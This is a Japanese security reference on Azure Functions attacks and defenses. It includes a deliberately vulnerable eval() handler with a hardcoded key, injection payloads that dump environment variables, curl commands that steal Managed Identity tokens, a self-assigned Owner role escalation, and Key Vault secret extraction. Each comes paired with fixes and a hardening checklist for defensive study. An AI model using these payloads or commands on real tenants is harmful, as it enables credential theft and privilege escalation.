# Azure Functions セキュリティリファレンス

## 概要

Azure Functions環境における攻撃パターンと防御戦略を、攻防両面から解説する。コード注入、SSRF、過剰権限Managed Identity、Key Vault窃取、権限昇格の実例を含む。

---

## Azure Functions の脅威

### 主な攻撃ベクトル

- **コード注入**: `eval()` 等の危険な関数による任意コード実行
- **SSRF (Server-Side Request Forgery)**: 内部リソースへの不正アクセス
- **過剰権限Managed Identity**: 最小権限原則違反による権限昇格
- **Key Vault窃取**: アクセストークン窃取によるシークレット流出
- **環境変数窃取**: ハードコードされた認証情報・API キーの流出

### Azure関連用語

| 用語 | 説明 |
|------|------|
| **Function App** | 1つ以上のAzure Functionsをホストするコンテナ（実行環境・スケーリング・ネットワーク設定を含む） |
| **Managed Identity** | コード内に認証情報を保存せずにAzureサービスを認証できるID（AWS IAM Roleに相当） |
| **Resource Group** | Azure リソースを論理的にまとめるコンテナ（まとめて管理・更新・削除可能） |
| **Function Key** | Azure Function呼び出しを認証・認可するシークレットトークン |
| **Storage Account** | Blob、ファイル、キュー、テーブル、ディスク等のクラウドストレージを提供 |
| **RBAC (Role-Based Access Control)** | Azureロールベースアクセス制御（権限管理） |
| **Principal** | ユーザー、グループ、Managed Identityなどロールを割り当て可能なセキュリティエンティティ |
| **Scope** | ロール割り当てが適用されるリソースの範囲（リソース、リソースグループ、サブスクリプション） |

---

## 攻撃シナリオ1: コード注入による環境変数窃取

### 脆弱なコード例

```javascript
// ❌ 危険: eval() による任意コード実行
const { app } = require('@azure/functions');
const HARDCODED_KEY = "67890ghijkl";

app.http('evaluate', {
  methods: ['POST'],
  authLevel: 'function',
  handler: async (request, context) => {
    const expression = await request.text() || '"No expression provided"';
    let result;
    try {
      result = eval(expression);  // 脆弱性
    } catch (err) {
      result = `Error: ${err.message}`;
    }
    return { body: `Evaluation result: ${result}` };
  }
});
```

### 攻撃ペイロード例

```javascript
// 【警告】以下は攻撃パターンの説明目的。実装では使用しないこと

// ファイル一覧取得
require('fs').readdirSync('./')

// ソースコード読み込み
require('fs').readFileSync('./src/functions/evaluate.js', 'utf8')

// 環境変数窃取
JSON.stringify(process.env)

// 特定環境変数取得
JSON.stringify(process.env.SAMPLE_API_KEY)
```

### 防御策

```javascript
// ✅ 安全: eval() を使用しない
// - 入力検証とサニタイゼーション
// - math.js等の専用ライブラリを使用
// - サンドボックス化された実行環境

const math = require('mathjs');

app.http('evaluate', {
  methods: ['POST'],
  authLevel: 'function',
  handler: async (request, context) => {
    const expression = await request.text() || '0';
    let result;
    try {
      // ✅ 安全: math.evaluate() は数式のみ評価
      result = math.evaluate(expression);
    } catch (err) {
      result = `Error: Invalid expression`;
    }
    return { body: `Result: ${result}` };
  }
});
```

---

## Azure Key Vault でのシークレット管理

### Key Vault へのシークレット保存

```bash
# Key Vault作成
az keyvault create \
  --name $KEYVAULT_NAME \
  --resource-group $RESOURCE_GROUP \
  --location $LOCATION \
  --sku standard

# RBAC有効化確認
az keyvault show --name $KEYVAULT_NAME \
  --query properties.enableRbacAuthorization

# ユーザーにKey Vault Secrets Officer ロール付与
az role assignment create \
  --role "Key Vault Secrets Officer" \
  --assignee $USER_UPN \
  --scope $SCOPE

# シークレット作成
az keyvault secret set \
  --vault-name $KEYVAULT_NAME \
  --name "secret00" \
  --value "SECRETABC123"
```

### Managed Identity 設定

```bash
# System-assigned Managed Identity 有効化
az functionapp identity assign \
  --name $FUNCTION_APP \
  --resource-group $RESOURCE_GROUP

# Principal ID 取得
PRINCIPAL_ID=$(az functionapp identity show \
  --name $FUNCTION_APP \
  --resource-group $RESOURCE_GROUP \
  | jq -r ".principalId")

# Key Vault Secrets Officer ロールをManaged Identityに付与
az role assignment create \
  --role "Key Vault Secrets Officer" \
  --assignee $PRINCIPAL_ID \
  --scope $SCOPE_KV

# Function AppにKey Vault名を環境変数として設定
az functionapp config appsettings set \
  --name $FUNCTION_APP \
  --resource-group $RESOURCE_GROUP \
  --settings KEYVAULT_NAME=$KEYVAULT_NAME
```

### Function からKey Vault アクセス

```javascript
const { DefaultAzureCredential } = require("@azure/identity");
const { SecretClient } = require("@azure/keyvault-secrets");

const KEY_VAULT_NAME = process.env.KEYVAULT_NAME;
const KV_URL = `https://${KEY_VAULT_NAME}.vault.azure.net`;

const credential = new DefaultAzureCredential();
const client = new SecretClient(KV_URL, credential);

const secrets = {};
(async () => {
  for (const name of SECRET_NAMES) {
    try {
      const secret = await client.getSecret(name);
      secrets[name] = secret.value;
    } catch (err) {
      console.error(`Failed to fetch secret ${name}: ${err.message}`);
      secrets[name] = null;
    }
  }
})();
```

---

## 攻撃シナリオ2: 過剰権限Managed Identityによる権限昇格

### Management PlaneとData Planeの違い

| Plane | 用途 | トークンaudience |
|-------|------|------------------|
| **Management Plane** | リソース作成・設定変更等の管理操作 | `https://management.azure.com/` |
| **Data Plane** | リソース内のコンテンツ操作（Key Vaultシークレット読み書き等） | `https://vault.azure.net/` |

### 権限昇格攻撃パターン

#### アクセストークン窃取（攻撃例）

攻撃者はコード注入によりManaged Identityのトークンを窃取する:

```bash
# 【警告】攻撃パターンの説明。防御側はこのような操作を検知・ブロックすること

# Management Plane トークン窃取
curl -s -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}" \
  "${IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01"

# Data Plane トークン窃取（Key Vault用）
curl -s -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}" \
  "${IDENTITY_ENDPOINT}?resource=https://vault.azure.net/&api-version=2019-08-01"
```

#### 権限昇格（攻撃例）

User Access Administratorロールを持つManaged Identityは自己にOwnerロールを付与可能:

```bash
# Ownerロール自己割り当て
URL="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01"

curl -X PUT $URL \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"properties\": {
      \"roleDefinitionId\": \"$OWNER_ROLE_ID\",
      \"principalId\": \"$PRINCIPAL_ID\"
    }
  }"
```

#### Key Vault シークレット窃取（攻撃例）

```bash
# Key Vault一覧取得
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"

# シークレット一覧取得
curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
  "https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5"

# シークレット値取得
curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
  "${SECRET_ID}?api-version=7.5" | jq '{name: .id, value: .value}'
```

---

## 最小権限の適用（防御）

### 危険なロール組み合わせ

| ロール | 権限 | リスク |
|--------|------|--------|
| **Owner** | サブスクリプション全体の完全制御 | すべてのリソースへのフルアクセス |
| **User Access Administrator** | ロール割り当て変更 | 自己に任意のロールを付与可能 → 権限昇格 |
| **Contributor** | リソース作成・変更・削除 | ロール割り当て以外のすべての操作 |
| **Key Vault Secrets Officer** | Key Vaultシークレット完全制御 | シークレット読み書き削除 |

### 過剰権限の削除

```bash
# 現在のロール割り当て確認
az role assignment list \
  --assignee $PRINCIPAL_ID \
  --all \
  -o table

# ロール割り当て削除
az role assignment delete \
  --assignee "$PRINCIPAL_ID" \
  --role "Owner" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

az role assignment delete \
  --assignee "$PRINCIPAL_ID" \
  --role "User Access Administrator" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

az role assignment delete \
  --assignee "$PRINCIPAL_ID" \
  --role "Contributor" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

az role assignment delete \
  --assignee "$PRINCIPAL_ID" \
  --role "Key Vault Secrets Officer" \
  --scope "$SCOPE_KV"
```

### 必要最小限のロール設計

```bash
# ✅ 推奨: Key Vault読み取りのみ必要な場合
az role assignment create \
  --role "Key Vault Secrets User" \
  --assignee $PRINCIPAL_ID \
  --scope "$SCOPE_KV"

# ✅ 推奨: 特定リソースグループのみ
az role assignment create \
  --role "Reader" \
  --assignee $PRINCIPAL_ID \
  --scope "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP"
```

---

## Azure セキュリティチェックリスト

### コード・設定

- [ ] **eval()、exec()、spawn() 等の危険な関数を使用しない**
- [ ] **入力検証とサニタイゼーション実装**
- [ ] **ハードコードされた認証情報を排除**
- [ ] **Key Vault でシークレット管理**
- [ ] **Function Key で認証レベル `function` 設定**

### Managed Identity

- [ ] **System-assigned Managed Identity 使用**
- [ ] **最小権限原則適用（Owner / User Access Administrator ロール付与禁止）**
- [ ] **スコープを必要最小限に制限（サブスクリプションレベル付与回避）**
- [ ] **定期的なロール割り当てレビュー**

### Key Vault

- [ ] **RBAC 有効化（レガシーアクセスポリシー無効化）**
- [ ] **Key Vault Secrets Officer ではなく Secrets User を優先**
- [ ] **ネットワークアクセス制限（Private Endpoint / Firewall）**
- [ ] **論理削除有効化（accidental deletion対策）**

### 監視・ログ

- [ ] **Azure Monitor / Application Insights 有効化**
- [ ] **コントロールプレーン操作監査（ロール割り当て変更検知）**
- [ ] **異常なKey Vaultアクセスパターン検知**
- [ ] **Managed Identity トークン使用状況監視**

### 開発・デプロイ

- [ ] **IaC（Infrastructure as Code）でロール割り当て管理**
- [ ] **開発環境で権限変更テスト**
- [ ] **本番環境へのデプロイ前にセキュリティレビュー実施**
- [ ] **自動化スクリプトによる一貫した権限設定**

---

## 参考資料

- [Microsoft Security Testing Rules of Engagement](https://learn.microsoft.com/azure/security/penetration-testing)
- [Azure RBAC Documentation](https://learn.microsoft.com/azure/role-based-access-control/)
- [Azure Key Vault Security](https://learn.microsoft.com/azure/key-vault/general/security-features)
- [Managed Identities for Azure Resources](https://learn.microsoft.com/azure/active-directory/managed-identities-azure-resources/)
